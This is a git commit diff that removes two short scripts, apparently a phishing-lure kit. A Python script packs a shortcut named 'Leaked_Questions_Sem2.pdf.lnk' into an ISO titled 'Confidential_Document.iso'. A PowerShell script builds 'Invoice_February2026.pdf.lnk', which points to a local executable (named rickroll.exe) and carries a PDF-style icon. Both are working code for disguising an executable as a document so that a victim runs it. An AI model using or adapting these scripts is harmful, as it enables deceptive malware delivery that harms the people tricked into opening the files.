7b7385345ddf8bdf86bc55c6d3dbaf12e1e43657
OnlyOneAvenir <emmanueladekanye1124@gmail.com>
2026-02-21 15:00:20 +0100

    init

--- make_iso.py
+++
@@ -1,6 +0,0 @@
-﻿import pycdlib
-iso = pycdlib.PyCdlib()
-iso.new(joliet=3)
-iso.add_file('iso_contents/Leaked_Questions_Sem2.pdf.lnk', joliet_path='/Leaked_Questions_Sem2.pdf.lnk')
-iso.write('Confidential_Document.iso')
-iso.close()
--- runme2.ps1
+++
@@ -1,5 +0,0 @@
-$shell = New-Object -ComObject WScript.Shell
-$lnk = $shell.CreateShortcut("$PWD\Invoice_February2026.pdf.lnk")
-$lnk.TargetPath = "C:\Users\ASUS ZEPHYRUS G15\Music\workspace\rickroll.exe"
-$lnk.IconLocation = "C:\Windows\System32\imageres.dll,102"
-$lnk.Save()
